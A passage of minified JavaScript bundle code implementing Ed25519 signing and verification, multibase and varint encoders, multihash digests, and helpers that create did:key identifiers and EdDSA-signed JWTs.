Q=Uh(F),te=U?f:n.ORDER;Kl("pointHex.y",Q,Ir,te);const se=d(Q*Q),le=d(se-Cn),pe=d(M*se-N);let{isValid:he,value:fe}=g(le,pe);if(!he)throw new Error("Point.fromHex: invalid y coordinate");const xe=(fe&Cn)===Cn,Oe=(q&128)!==0;if(!U&&fe===Ir&&Oe)throw new Error("Point.fromHex: x=0 and x_0=1");return Oe!==xe&&(fe=d(-fe)),O.fromAffine({x:fe,y:Q})}static fromPrivateKey(C){return k(C).point}toRawBytes(){const{x:C,y:U}=this.toAffine(),M=vy(U,n.BYTES);return M[M.length-1]|=C&Cn?128:0,M}toHex(){return Hm(this.toRawBytes())}}O.BASE=new O(e.Gx,e.Gy,Cn,d(e.Gx*e.Gy)),O.ZERO=new O(Ir,Cn,Cn,Ir);const{BASE:$,ZERO:R}=O,T=NC(O,c*8);function D(A){return kt(A,r)}function B(A){return D(Uh(A))}function k(A){const C=n.BYTES;A=pi("private key",A,C);const U=pi("hashed private key",o(A),2*C),M=E(U.slice(0,C)),N=U.slice(C,2*C),V=B(M),F=$.multiply(V),q=F.toRawBytes();return{head:M,prefix:N,scalar:V,point:F,pointBytes:q}}function G(A){return k(A).pointBytes}function W(A=new Uint8Array,...C){const U=V1(...C);return B(o(w(U,pi("context",A),!!i)))}function J(A,C,U={}){A=pi("message",A),i&&(A=i(A));const{prefix:M,scalar:N,pointBytes:V}=k(C),F=W(U.context,M,A),q=$.multiply(F).toRawBytes(),Q=W(U.context,q,V,A),te=D(F+Q*N);Kl("signature.s",te,Ir,r);const se=V1(q,vy(te,n.BYTES));return pi("result",se,n.BYTES*2)}const ne=jC;function j(A,C,U,M=ne){const{context:N,zip215:V}=M,F=n.BYTES;A=pi("signature",A,2*F),C=pi("message",C),U=pi("publicKey",U,F),V!==void 0&&sg("zip215",V),i&&(C=i(C));const q=Uh(A.slice(F,2*F));let Q,te,se;try{Q=O.fromHex(U,V),te=O.fromHex(A.slice(0,F),V),se=$.multiplyUnsafe(q)}catch{return!1}if(!V&&Q.isSmallOrder())return!1;const le=W(N,te.toRawBytes(),Q.toRawBytes(),C);return te.add(Q.multiplyUnsafe(le)).subtract(se).clearCofactor().equals(O.ZERO)}return $._setWindowSize(8),{CURVE:e,getPublicKey:G,sign:J,verify:j,ExtendedPoint:O,utils:{getExtendedPublicKey:k,randomPrivateKey:()=>l(n.BYTES),precompute(A=8,C=O.BASE){return C._setWindowSize(A),C.multiply(BigInt(3)),C}}}}BigInt(0),BigInt(1);const Wm=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),Z1=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const FC=BigInt(1),Q1=BigInt(2);BigInt(3);const zC=BigInt(5),qC=BigInt(8);function HC(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),o=Wm,l=t*t%o*t%o,c=qr(l,Q1,o)*l%o,u=qr(c,FC,o)*t%o,f=qr(u,zC,o)*u%o,d=qr(f,e,o)*f%o,y=qr(d,n,o)*d%o,g=qr(y,r,o)*y%o,E=qr(g,i,o)*g%o,w=qr(E,i,o)*g%o,b=qr(w,e,o)*f%o;return{pow_p_5_8:qr(b,Q1,o)*t%o,b2:l}}function VC(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function WC(t,e){const n=Wm,r=kt(e*e*e,n),i=kt(r*r*e,n),o=HC(t*i).pow_p_5_8;let l=kt(t*r*o,n);const c=kt(e*l*l,n),u=l,f=kt(l*Z1,n),d=c===t,y=c===kt(-t,n),g=c===kt(-t*Z1,n);return d&&(l=u),(y||g)&&(l=f),$C(l,n)&&(l=kt(-l,n)),{isValid:d||y,value:l}}const KC=wS(Wm,void 0,!0),GC={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:KC,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:qC,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:gC,randomBytes:hS,adjustScalarBytes:VC,uvRatio:WC},ES=MC(GC),YC="EdDSA",JC="JWT",Qh=".",Ef="base64url",xS="utf8",SS="utf8",ZC=":",QC="did",XC="key",X1="base58btc",eR="z",tR="K36",nR=32;function Km(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function _S(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?Km(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function IS(t,e){e||(e=t.reduce((i,o)=>i+o.length,0));const n=_S(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return Km(n)}function rR(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var o=t.charAt(i),l=o.charCodeAt(0);if(n[l]!==255)throw new TypeError(o+" is ambiguous");n[l]=i}var c=t.length,u=t.charAt(0),f=Math.log(c)/Math.log(256),d=Math.log(256)/Math.log(c);function y(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var b=0,m=0,x=0,S=w.length;x!==S&&w[x]===0;)x++,b++;for(var O=(S-x)*d+1>>>0,$=new Uint8Array(O);x!==S;){for(var R=w[x],T=0,D=O-1;(R!==0||T<m)&&D!==-1;D--,T++)R+=256*$[D]>>>0,$[D]=R%c>>>0,R=R/c>>>0;if(R!==0)throw new Error("Non-zero carry");m=T,x++}for(var B=O-m;B!==O&&$[B]===0;)B++;for(var k=u.repeat(b);B<O;++B)k+=t.charAt($[B]);return k}function g(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var b=0;if(w[b]!==" "){for(var m=0,x=0;w[b]===u;)m++,b++;for(var S=(w.length-b)*f+1>>>0,O=new Uint8Array(S);w[b];){var $=n[w.charCodeAt(b)];if($===255)return;for(var R=0,T=S-1;($!==0||R<x)&&T!==-1;T--,R++)$+=c*O[T]>>>0,O[T]=$%256>>>0,$=$/256>>>0;if($!==0)throw new Error("Non-zero carry");x=R,b++}if(w[b]!==" "){for(var D=S-x;D!==S&&O[D]===0;)D++;for(var B=new Uint8Array(m+(S-D)),k=m;D!==S;)B[k++]=O[D++];return B}}}function E(w){var b=g(w);if(b)return b;throw new Error(`Non-${e} character`)}return{encode:y,decodeUnsafe:g,decode:E}}var iR=rR,sR=iR;const OS=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},oR=t=>new TextEncoder().encode(t),aR=t=>new TextDecoder().decode(t);let lR=class{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},cR=class{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return $S(this,e)}},uR=class{constructor(e){this.decoders=e}or(e){return $S(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const $S=(t,e)=>new uR({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let hR=class{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new lR(e,n,r),this.decoder=new cR(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const xf=({name:t,prefix:e,encode:n,decode:r})=>new hR(t,e,n,r),Nc=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=sR(n,e);return xf({prefix:t,name:e,encode:r,decode:o=>OS(i(o))})},fR=(t,e,n,r)=>{const i={};for(let d=0;d<e.length;++d)i[e[d]]=d;let o=t.length;for(;t[o-1]==="=";)--o;const l=new Uint8Array(o*n/8|0);let c=0,u=0,f=0;for(let d=0;d<o;++d){const y=i[t[d]];if(y===void 0)throw new SyntaxError(`Non-${r} character`);u=u<<n|y,c+=n,c>=8&&(c-=8,l[f++]=255&u>>c)}if(c>=n||255&u<<8-c)throw new SyntaxError("Unexpected end of data");return l},dR=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let o="",l=0,c=0;for(let u=0;u<t.length;++u)for(c=c<<8|t[u],l+=8;l>n;)l-=n,o+=e[i&c>>l];if(l&&(o+=e[i&c<<n-l]),r)for(;o.length*n&7;)o+="=";return o},ln=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>xf({prefix:e,name:t,encode(i){return dR(i,r,n)},decode(i){return fR(i,r,n,t)}}),pR=xf({prefix:"\0",name:"identity",encode:t=>aR(t),decode:t=>oR(t)});var gR=Object.freeze({__proto__:null,identity:pR});const yR=ln({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var mR=Object.freeze({__proto__:null,base2:yR});const wR=ln({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var vR=Object.freeze({__proto__:null,base8:wR});const bR=Nc({prefix:"9",name:"base10",alphabet:"0123456789"});var ER=Object.freeze({__proto__:null,base10:bR});const xR=ln({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),SR=ln({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var _R=Object.freeze({__proto__:null,base16:xR,base16upper:SR});const IR=ln({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),OR=ln({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),$R=ln({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),PR=ln({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),TR=ln({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),AR=ln({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),CR=ln({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),RR=ln({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),DR=ln({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var NR=Object.freeze({__proto__:null,base32:IR,base32upper:OR,base32pad:$R,base32padupper:PR,base32hex:TR,base32hexupper:AR,base32hexpad:CR,base32hexpadupper:RR,base32z:DR});const kR=Nc({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),BR=Nc({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var LR=Object.freeze({__proto__:null,base36:kR,base36upper:BR});const jR=Nc({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),UR=Nc({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var MR=Object.freeze({__proto__:null,base58btc:jR,base58flickr:UR});const FR=ln({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),zR=ln({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),qR=ln({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),HR=ln({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var VR=Object.freeze({__proto__:null,base64:FR,base64pad:zR,base64url:qR,base64urlpad:HR});const PS=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),WR=PS.reduce((t,e,n)=>(t[n]=e,t),[]),KR=PS.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function GR(t){return t.reduce((e,n)=>(e+=WR[n],e),"")}function YR(t){const e=[];for(const n of t){const r=KR[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const JR=xf({prefix:"🚀",name:"base256emoji",encode:GR,decode:YR});var ZR=Object.freeze({__proto__:null,base256emoji:JR}),QR=TS,eb=128,XR=-128,e8=Math.pow(2,31);function TS(t,e,n){e=e||[],n=n||0;for(var r=n;t>=e8;)e[n++]=t&255|eb,t/=128;for(;t&XR;)e[n++]=t&255|eb,t>>>=7;return e[n]=t|0,TS.bytes=n-r+1,e}var t8=Ey,n8=128,tb=127;function Ey(t,r){var n=0,r=r||0,i=0,o=r,l,c=t.length;do{if(o>=c)throw Ey.bytes=0,new RangeError("Could not decode varint");l=t[o++],n+=i<28?(l&tb)<<i:(l&tb)*Math.pow(2,i),i+=7}while(l>=n8);return Ey.bytes=o-r,n}var r8=Math.pow(2,7),i8=Math.pow(2,14),s8=Math.pow(2,21),o8=Math.pow(2,28),a8=Math.pow(2,35),l8=Math.pow(2,42),c8=Math.pow(2,49),u8=Math.pow(2,56),h8=Math.pow(2,63),f8=function(t){return t<r8?1:t<i8?2:t<s8?3:t<o8?4:t<a8?5:t<l8?6:t<c8?7:t<u8?8:t<h8?9:10},d8={encode:QR,decode:t8,encodingLength:f8},AS=d8;const nb=(t,e,n=0)=>(AS.encode(t,e,n),e),rb=t=>AS.encodingLength(t),xy=(t,e)=>{const n=e.byteLength,r=rb(t),i=r+rb(n),o=new Uint8Array(i+n);return nb(t,o,0),nb(n,o,r),o.set(e,i),new p8(t,n,e,o)};let p8=class{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}};const CS=({name:t,code:e,encode:n})=>new g8(t,e,n);let g8=class{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?xy(this.code,n):n.then(r=>xy(this.code,r))}else throw Error("Unknown type, must be binary type")}};const RS=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),y8=CS({name:"sha2-256",code:18,encode:RS("SHA-256")}),m8=CS({name:"sha2-512",code:19,encode:RS("SHA-512")});var w8=Object.freeze({__proto__:null,sha256:y8,sha512:m8});const DS=0,v8="identity",NS=OS,b8=t=>xy(DS,NS(t)),E8={code:DS,name:v8,encode:NS,digest:b8};var x8=Object.freeze({__proto__:null,identity:E8});new TextEncoder,new TextDecoder;const ib={...gR,...mR,...vR,...ER,..._R,...NR,...LR,...MR,...VR,...ZR};({...w8,...x8});function kS(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const sb=kS("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),hg=kS("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=_S(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),BS={utf8:sb,"utf-8":sb,hex:ib.base16,latin1:hg,ascii:hg,binary:hg,...ib};function Sf(t,e="utf8"){const n=BS[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}function Wa(t,e="utf8"){const n=BS[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?Km(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function ob(t){return BA(Sf(Wa(t,Ef),xS))}function Xh(t){return Sf(Wa(LA(t),xS),Ef)}function LS(t){const e=Wa(tR,X1),n=eR+Sf(IS([e,t]),X1);return[QC,XC,n].join(ZC)}function S8(t){return Sf(t,Ef)}function _8(t){return Wa(t,Ef)}function I8(t){return Wa([Xh(t.header),Xh(t.payload)].join(Qh),SS)}function O8(t){return[Xh(t.header),Xh(t.payload),S8(t.signature)].join(Qh)}function Sy(t){const e=t.split(Qh),n=ob(e[0]),r=ob(e[1]),i=_8(e[2]),o=Wa(e.slice(0,2).join(Qh),SS);return{header:n,payload:r,signature:i,data:o}}function ab(t=hS(nR)){const e=ES.getPublicKey(t);return{secretKey:IS([t,e]),publicKey:e}}async function $8(t,e,n,r,i=be.fromMiliseconds(Date.now())){const o={alg:YC,typ:JC},l=LS(r.publicKey),c=i+n,u={iss:l,sub:t,aud:e,iat:i,exp:c},f=I8({header:o,payload:u}),d=ES.sign(f,r.secretKey.slice(0,32));return O8({header:o,payload:u,signature:d})}function jS(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function fc(t,e){e||(e=t.reduce((i,o)=>i+o.length,0));const n=jS(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return n}function P8(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var o=t.charAt(i),l=o.charCodeAt(0);if(n[l]!==255)throw new TypeError(o+" is ambiguous");n[l]=i}var c=t.length,u=t.charAt(0),f=Math.log(c)/Math.log(256),d=Math.log(256)/Math.log(c);function y(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var b=0,m=0,x=0,S=w.length;x!==S&&w[x]===0;)x++,b++;for(var O=(S-x)*d+1>>>0,$=new Uint8Array(O);x!==S;){for(var R=w[x],T=0,D=O-1;(R!==0||T<m)&&D!==-1;D--,T++)R+=256*$[D]>>>0,$[D]=R%c>>>0,R=R/c>>>0;if(R!==0)throw new Error("Non-zero carry");m=T,x++}for(var B=O-m;B!==O&&$[B]===0;)B++;for(var k=u.repeat(b);B<O;++B)k+=t.charAt($[B]);return k}function g(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var b=0;if(w[b]!==" "){for(var m=0,x=0;w[b]===u;)m++,b++;for(var S=(w.length-b)*f+1>>>0,O=new Uint8Array(S);w[b];){var $=n[w.charCodeAt(b)];if($===255)return;for(var R=0,T=S-1;($!==0||R<x)&&T!==-1;T--,R++)$+=c*O[T]>>>0,O[T]=$%256>>>0,$=$/256>>>0;if($!==0)throw new Error("Non-zero carry");x=R,b++}if(w[b]!==" "){for(var D=S-x;D!==S&&O[D]===0;)D++;for(var B=new Uint8Array(m+(S-D)),k=m;D!==S;)B[k++]=O[D++];return B}}}function E(w){var b=g(w);if(b)return b;throw new Error(`Non-${e} character`)}return{encode:y,decodeUnsafe:g,decode:E}}var T8=P8,A8=T8;const C8=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},R8=t=>new TextEncoder().encode(t),D8=t=>new TextDecoder().decode(t);class N8{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class k8{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return US(this,e)}}class B8{constructor(e){this.decoders=e}or(e){return US(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const US=(t,e)=>new B8({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class L8{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new N8(e,n,r),this.decoder=new k8(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const _f=({name:t,prefix:e,encode:n,decode:r})=>new L8(t,e,n,r),kc=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=A8(n,e);return _f({prefix:t,name:e,encode:r,decode:o=>C8(i(o))})},j8=(t,e,n,r)=>{const i={};for(let d=0;d<e.length;++d)i[e[d]]=d;let o=t.length;for(;t[o-1]==="=";)--o;const l=new Uint8Array(o*n/8|0);let c=0,u=0,f=0;for(let d=0;d<o;++d){const y=i[t[d]];if(y===void 0)throw new SyntaxError(`Non-${r} character`);u=u<<n|y,c+=n,c>=8&&(c-=8,l[f++]=255&u>>c)}if(c>=n||255&u<<8-c)throw new SyntaxError("Unexpected end of data");return l},U8=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let o="",l=0,c=0;for(let u=0;u<t.length;++u)for(c=c<<8|t[u],l+=8;l>n;)l-=n,o+=e[i&c>>l];if(l&&(o+=e[i&c<<n-l]),r)for(;o.length*n&7;)o+="=";return o},cn=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>_f({prefix:e,name:t,encode(i){return U8(i,r,n)},decode(i){return j8(i,r,n,t)}}),M8=_f({prefix:"\0",name:"identity",encode:t=>D8(t),decode:t=>R8(t)}),F8=Object.freeze(Object.defineProperty({__proto__:null,identity:M8},Symbol.toStringTag,{value:"Module"})),z8=cn({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),q8=Object.freeze(Object.defineProperty({__proto__:null,base2:z8},Symbol.toStringTag,{value:"Module"})),H8=cn({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),V8=Object.freeze(Object.defineProperty({__proto__:null,base8:H8},Symbol.toStringTag,{value:"Module"})),W8=kc({prefix:"9",name:"base10",alphabet:"0123456789"}),K8=Object.freeze(Object.defineProperty({__proto__:null,base10:W8},Symbol.toStringTag,{value:"Module"})),G8=cn({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),Y8=cn({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),J8=Object.freeze(Object.defineProperty({__proto__:null,base16:G8,base16upper:Y8},Symbol.toStringTag,{value:"Module"})),Z8=cn({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),Q8=cn({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),X8=cn({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),eD=cn({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),tD=cn({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),nD=cn({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),rD=cn({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),iD=cn({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),sD=cn({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),oD=Object.freeze(Object.defineProperty({__proto__:null,base32:Z8,base32hex:tD,base32hexpad:rD,base32hexpadupper:iD,base32hexupper:nD,base32pad:X8,base32padupper:eD,base32upper:Q8,base32z:sD},Symbol.toStringTag,{value:"Module"})),aD=kc({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),lD=kc({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),cD=Object.freeze(Object.defineProperty({__proto__:null,base36:aD,base36upper:lD},Symbol.toStringTag,{value:"Module"})),uD=kc({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),hD=kc({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),fD=Object.freeze(Object.defineProperty({__proto__:null,base58btc:uD,base58flickr:hD},Symbol.toStringTag,{value:"Module"})),dD=cn({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),pD=cn({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),gD=cn({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),yD=cn({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),mD=Object.freeze(Object.defineProperty({__proto__:null,base64:dD,base64pad:pD,base64url:gD,base64urlpad:yD},Symbol.toStringTag,{value:"Module"})),MS=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),wD=MS.reduce((t,e,n)=>(t[n]=e,t),[]),vD=MS.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);f